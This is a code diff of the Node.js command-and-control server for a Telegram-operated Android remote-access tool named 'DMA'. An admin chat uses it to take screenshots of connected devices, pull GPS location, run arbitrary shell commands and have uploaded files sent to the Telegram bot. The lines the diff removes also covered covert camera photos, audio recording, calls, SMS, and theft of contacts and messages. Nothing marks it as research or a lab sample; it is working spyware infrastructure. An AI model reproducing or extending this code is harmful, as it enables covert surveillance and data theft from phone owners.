-bot.on('callback_query', (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-    
-    if (chatId.toString() !== adminId) return;
-    
-    const [action, deviceId] = data.split('_');
-    
-    switch(action) {
-        case 'screenshot':
-            sendCommandToDevice(deviceId, 'take_screenshot');
-            bot.answerCallbackQuery(callbackQuery.id, { text: '📸 Taking screenshot...' });
-            break;
-            
-        case 'location':
-            sendCommandToDevice(deviceId, 'get_location');
-            bot.answerCallbackQuery(callbackQuery.id, { text: '📍 Getting location...' });
-            break;
-            
-        case 'camera':
-            setUserSession(chatId, { 
-                state: 'awaiting_camera_type', 
-                deviceId: deviceId,
-                lastState: 'camera'
-            });
-            bot.sendMessage(chatId, '📷 Select camera type:', cameraTypeKeyboard);
-            bot.answerCallbackQuery(callbackQuery.id);
-            break;
-            
-        case 'record':
-            setUserSession(chatId, { 
-                state: 'awaiting_record_duration', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, '🎤 Select recording duration:', recordDurationKeyboard);
-            bot.answerCallbackQuery(callbackQuery.id);
-            break;
-            
-        case 'files':
-            setUserSession(chatId, { 
-                state: 'awaiting_file_path', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, '📁 Enter file path to browse:\nExample: /storage/emulated/0/Downloads', removeKeyboard);
-            bot.answerCallbackQuery(callbackQuery.id);
-            break;
-            
-        case 'call':
-            setUserSession(chatId, { 
-                state: 'awaiting_call_number', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, '📞 Enter phone number to call:', removeKeyboard);
-            bot.answerCallbackQuery(callbackQuery.id);
-            break;
-            
-        case 'sms':
-            setUserSession(chatId, { 
-                state: 'awaiting_sms_number', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, '💬 Enter phone number to send SMS:', removeKeyboard);
-            bot.answerCallbackQuery(callbackQuery.id);
-            break;
-            
-        case 'apps':
-            sendCommandToDevice(deviceId, 'list_apps');
-            bot.answerCallbackQuery(callbackQuery.id, { text: '📱 Getting apps list...' });
-            break;
-            
-        case 'cmd':
-            setUserSession(chatId, { 
-                state: 'awaiting_command', 
-                deviceId: deviceId
-            });
-            bot.sendMessage(chatId, '⚡ Enter command to execute:', removeKeyboard);
-            bot.answerCallbackQuery(callbackQuery.id);
-            break;
-    }
-});
-
-// Command handlers
-bot.onText(/\/cmd/, (msg) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    if (connectedDevices.size === 0) {
-        bot.sendMessage(chatId, '❌ No devices connected');
-        return;
-    }
-    
-    setUserSession(chatId, { state: 'awaiting_device_for_command' });
-    bot.sendMessage(chatId, '⚡ Select device to execute command:', deviceSelectionKeyboard(connectedDevices));
-});
-
-bot.onText(/\/file/, (msg) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    if (connectedDevices.size === 0) {
-        bot.sendMessage(chatId, '❌ No devices connected');
-        return;
-    }
-    
-    setUserSession(chatId, { state: 'awaiting_device_for_file' });
-    bot.sendMessage(chatId, '📁 Select device to get file:', deviceSelectionKeyboard(connectedDevices));
+    safeSendMessage(chatId, response);
 });
 
 bot.onText(/\/screen (.+)/, (msg, match) => {
@@ -974,57 +468,9 @@ bot.onText(/\/screen (.+)/, (msg, match) => {
     
     if (device) {
         sendCommandToDevice(deviceId, 'take_screenshot');
-        bot.sendMessage(chatId, `📸 Screenshot command sent to ${deviceId.substring(0, 8)}...`);
+        safeSendMessage(chatId, `📸 Screenshot command sent to ${deviceId.substring(0, 8)}...`);
     } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
-    }
-});
-
-bot.onText(/\/call (.+) (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    const deviceId = match[1];
-    const phoneNumber = match[2];
-    
-    const device = connectedDevices.get(deviceId);
-    if (device) {
-        sendCommandToDevice(deviceId, 'make_call', { number: phoneNumber });
-        bot.sendMessage(chatId, `📞 Calling ${phoneNumber} on ${deviceId.substring(0, 8)}...`);
-    } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
-    }
-});
-
-bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    const deviceId = match[1];
-    const phoneNumber = match[2];
-    const message = match[3];
-    
-    const device = connectedDevices.get(deviceId);
-    if (device) {
-        sendCommandToDevice(deviceId, 'send_sms', { number: phoneNumber, message: message });
-        bot.sendMessage(chatId, `💬 Sending SMS to ${phoneNumber} on ${deviceId.substring(0, 8)}...`);
-    } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
-    }
-});
-
-bot.onText(/\/apps (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    const deviceId = match[1];
-    const device = connectedDevices.get(deviceId);
-    
-    if (device) {
-        sendCommandToDevice(deviceId, 'list_apps');
-        bot.sendMessage(chatId, `📱 Getting apps list from ${deviceId.substring(0, 8)}...`);
-    } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
+        safeSendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
     }
 });
 
@@ -1037,45 +483,13 @@ bot.onText(/\/location (.+)/, (msg, match) => {
     
     if (device) {
         sendCommandToDevice(deviceId, 'get_location');
-        bot.sendMessage(chatId, `📍 Getting location from ${deviceId.substring(0, 8)}...`);
+        safeSendMessage(chatId, `📍 Getting location from ${deviceId.substring(0, 8)}...`);
     } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
+        safeSendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
     }
 });
 
-bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    const deviceId = match[1];
-    const cameraType = match[2];
-    
-    const device = connectedDevices.get(deviceId);
-    if (device) {
-        sendCommandToDevice(deviceId, 'take_photo', { camera: cameraType });
-        bot.sendMessage(chatId, `📷 Taking ${cameraType} camera photo on ${deviceId.substring(0, 8)}...`);
-    } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
-    }
-});
-
-bot.onText(/\/record (.+) (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    const deviceId = match[1];
-    const seconds = parseInt(match[2]);
-    
-    const device = connectedDevices.get(deviceId);
-    if (device) {
-        sendCommandToDevice(deviceId, 'record_audio', { seconds: seconds });
-        bot.sendMessage(chatId, `🎤 Recording ${seconds} seconds on ${deviceId.substring(0, 8)}...`);
-    } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
-    }
-});
-
-bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
+bot.onText(/\/cmd (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (chatId.toString() !== adminId) return;
     
@@ -1085,179 +499,106 @@ bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
     const device = connectedDevices.get(deviceId);
     if (device) {
         sendCommandToDevice(deviceId, 'execute', { cmd: command });
-        bot.sendMessage(chatId, `⚡ Executing command on ${deviceId.substring(0, 8)}...\n\`${command}\``, { parse_mode: 'Markdown' });
+        safeSendMessage(chatId, `⚡ Executing command on ${deviceId.substring(0, 8)}...\n${command}`);
     } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
+        safeSendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
     }
-});
-
-bot.onText(/\/files (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    const deviceId = match[1];
-    const device = connectedDevices.get(deviceId);
-    
-    if (device) {
-        setUserSession(chatId, { 
-            state: 'awaiting_file_path', 
-            deviceId: deviceId
-        });
-        bot.sendMessage(chatId, `📁 Enter file path to browse on ${deviceId.substring(0, 8)}:\nExample: /storage/emulated/0/Downloads`, removeKeyboard);
-    } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
-    }
-});
-
-bot.onText(/\/contacts (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    const deviceId = match[1];
-    const device = connectedDevices.get(deviceId);
-    
-    if (device) {
-        sendCommandToDevice(deviceId, 'get_contacts');
-        bot.sendMessage(chatId, `📒 Getting contacts from ${deviceId.substring(0, 8)}...`);
-    } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
-    }
-});
-
-bot.onText(/\/messages (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    const deviceId = match[1];
-    const device = connectedDevices.get(deviceId);
-    
-    if (device) {
-        sendCommandToDevice(deviceId, 'get_messages');
-        bot.sendMessage(chatId, `📨 Getting messages from ${deviceId.substring(0, 8)}...`);
-    } else {
-        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
-    }
-});
-
-bot.onText(/\/settings/, (msg) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() !== adminId) return;
-    
-    bot.sendMessage(chatId, '⚙️ Device Settings:', settingsKeyboard);
 });
 
 bot.onText(/\/help/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() !== adminId) return;
     
-    showHelp(chatId);
+    const helpText = `🤖 DMA Help Guide
+
+Commands:
+/list - Show all connected devices
+/screen [device_id] - Take screenshot
+/location [device_id] - Get GPS location
+/cmd [device_id] [command] - Execute shell command
+
+Examples:
+/list
+/screen device123
+/location device123
+/cmd device123 ls -la
+
+Interactive Buttons:
+• Use the keyboard for quick actions
+• Select devices when prompted`;
+    
+    safeSendMessage(chatId, helpText, mainKeyboard);
 });
 
-function showHelp(chatId) {
-    const helpText = `
-🤖 *DMA - Help Guide*
-
-*Interactive Controls:*
-• Use the keyboard buttons for quick actions
-• Select devices from the list
-• Follow prompts for inputs
-
-*Available Features:*
-• 📸 Screenshot - Take device screenshot
-• 📍 Location - Get device GPS location
-• 📷 Camera - Take photo with front/rear camera
-• 🎤 Record - Record audio (10s-5min)
-• 📁 Files - Browse device filesystem
-• 📞 Call - Make phone call
-• 💬 SMS - Send text message
-• 📱 Apps - List installed applications
-• ⚡ Command - Execute shell commands
-• 📊 Info - Get detailed device information
-
-*Text Commands:*
-/list - Show connected devices
-/info <device_id> - Get device info
-/cmd <device_id> <command> - Execute command
-/file <device_id> <path> - Get file
-/screen <device_id> - Take screenshot
-/call <device_id> <number> - Make call
-/sms <device_id> <number> <message> - Send SMS
-/apps <device_id> - List installed apps
-/location <device_id> - Get location
-/camera <device_id> <front|back> - Take photo
-/record <device_id> <seconds> - Record audio
-/shell <device_id> <command> - Run shell command
-/files <device_id> - Browse files
-/contacts <device_id> - Get contacts
-/messages <device_id> - Get messages
-/settings - Device settings
-/keyboard - Show interactive keyboard
-
-*Note:* Replace <device_id> with the device ID shown in /list
-    `;
+// Button handlers
+bot.on('message', (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text;
     
-    bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
-}
+    if (chatId.toString() !== adminId || !text) return;
+    
+    switch (text) {
+        case '📱 List Devices':
+            bot.emit('text:/list', msg);
+            break;
+            
+        case '📸 Screenshot':
+            if (connectedDevices.size === 0) {
+                safeSendMessage(chatId, '❌ No devices connected');
+                return;
+            }
+            let deviceList = 'Select device ID:\n';
+            connectedDevices.forEach((device, id) => {
+                deviceList += `\`${id}\` - ${device.deviceInfo.model || 'Unknown'}\n`;
+            });
+            safeSendMessage(chatId, `${deviceList}\nUse: /screen [device_id]`);
+            break;
+            
+        case '📍 Location':
+            if (connectedDevices.size === 0) {
+                safeSendMessage(chatId, '❌ No devices connected');
+                return;
+            }
+            let locList = 'Select device ID:\n';
+            connectedDevices.forEach((device, id) => {
+                locList += `\`${id}\` - ${device.deviceInfo.model || 'Unknown'}\n`;
+            });
+            safeSendMessage(chatId, `${locList}\nUse: /location [device_id]`);
+            break;
+            
+        case '❓ Help':
+            bot.emit('text:/help', msg);
+            break;
+    }
+});
 
 // HTTP endpoints
-app.post('/api/upload', upload.single('file'), (req, res) => {
+app.post('/api/upload', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.headers['device-id'];
-        const fileType = req.headers['file-type'] || 'unknown';
         
-        if (!deviceId) {
-            return res.status(400).json({ error: 'Device ID required' });
+        if (!deviceId || !req.file) {
+            return res.status(400).json({ error: 'Missing device ID or file' });
         }
         
-        if (!req.file) {
-            return res.status(400).json({ error: 'No file uploaded' });
-        }
-        
-        const fileUrl = `${process.env.SERVER_URL || 'http://localhost:8999'}/${req.file.path}`;
+        const caption = `📁 File from ${deviceId}\nSize: ${(req.file.size / 1024 / 1024).toFixed(2)}MB`;
         
         // Send file to Telegram
-        const caption = `📁 File from ${deviceId}\nType: ${fileType}\nSize: ${(req.file.size / 1024 / 1024).toFixed(2)}MB`;
+        await bot.sendDocument(adminId, req.file.path, { caption });
         
-        bot.sendDocument(adminId, req.file.path, { caption })
-            .then(() => {
-                // Clean up after sending
-                setTimeout(() => {
-                    if (fs.existsSync(req.file.path)) {
-                        fs.unlinkSync(req.file.path);
-                    }
-                }, 60000);
-            });
+        // Clean up after sending
+        setTimeout(() => {
+            try {
+                if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
+            } catch (err) {}
+        }, 60000);
         
-        res.json({ success: true, url: fileUrl });
+        res.json({ success: true });
         
     } catch (error) {
         console.error('Upload error:', error);
         res.status(500).json({ error: 'Upload failed' });
     }
-});
-
-app.post('/api/getfile', (req, res) => {
-    const { deviceId, filePath } = req.body;
-    
-    if (!deviceId || !filePath) {
-        return res.status(400).json({ error: 'Missing parameters' });
-    }
-    
-    const device = connectedDevices.get(deviceId);
-    if (!device) {
-        return res.status(404).json({ error: 'Device not connected' });
-    }
-    
-    const cmdObj = {
-        type: 'command',
-        id: uuidv4(),
-        command: 'get_file',
-        data: { path: filePath },
-        timestamp: Date.now()
-    };
-    
-    device.ws.send(JSON.stringify(cmdObj));
-    res.json({ success: true, message: 'File request sent' });
 });
 
 // Health check endpoint
@@ -1274,51 +615,52 @@ app.get('/health', (req, res) => {
 setInterval(() => {
     const now = Date.now();
     userSessions.forEach((session, userId) => {
-        if (now - session.timestamp > 15 * 60 * 1000) { // 15 minutes
+        if (now - (session.timestamp || 0) > 15 * 60 * 1000) {
             userSessions.delete(userId);
         }
     });
-}, 5 * 60 * 1000); // Every 5 minutes
+}, 5 * 60 * 1000);
 
-// Cleanup old files periodically
+// Cleanup old files
 setInterval(() => {
     const now = Date.now();
-    const maxAge = 24 * 60 * 60 * 1000; // 24 hours
+    const maxAge = 24 * 60 * 60 * 1000;
     
     ['uploads', 'screenshots'].forEach(dir => {
-        if (fs.existsSync(dir)) {
-            fs.readdirSync(dir).forEach(file => {
-                const filePath = path.join(dir, file);
-                try {
-                    const stats = fs.statSync(filePath);
-                    if (now - stats.mtimeMs > maxAge) {
-                        fs.unlinkSync(filePath);
-                    }
-                } catch (error) {
-                    console.error('Cleanup error:', error);
+        if (!fs.existsSync(dir)) return;
+        fs.readdirSync(dir).forEach(file => {
+            const filePath = path.join(dir, file);
+            try {
+                const stats = fs.statSync(filePath);
+                if (now - stats.mtimeMs > maxAge) {
+                    fs.unlinkSync(filePath);
                 }
-            });
-        }
+            } catch (error) {}
+        });
     });
-}, 60 * 60 * 1000); // Every hour
+}, 60 * 60 * 1000);
 
 // Start server
 const PORT = process.env.PORT || 8999;
-server.listen(PORT, () => {
+server.listen(PORT, async () => {
     console.log(`🚀 DMA Server running on port ${PORT}`);
     console.log(`🤖 Bot: @Device1deep_bot`);
-    console.log(`🌐 Server: ${process.env.SERVER_URL || 'http://localhost:' + PORT}`);
-    logEvent('SERVER_STARTED', 'system', `Port: ${PORT}`);
     
-    // Setup bot commands on start
-    setupBotCommands().catch(console.error);
+    // Setup webhook or polling
+    await setupWebhook();
+    await setupBotCommands();
+    
+    logEvent('SERVER_STARTED', 'system', `Port: ${PORT}`);
 });
 
-// Handle graceful shutdown
+// Graceful shutdown
 process.on('SIGTERM', () => {
     console.log('SIGTERM received. Shutting down gracefully...');
     wss.close(() => {
         server.close(() => {
+            try {
+                if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
+            } catch (err) {}
             process.exit(0);
         });
     });
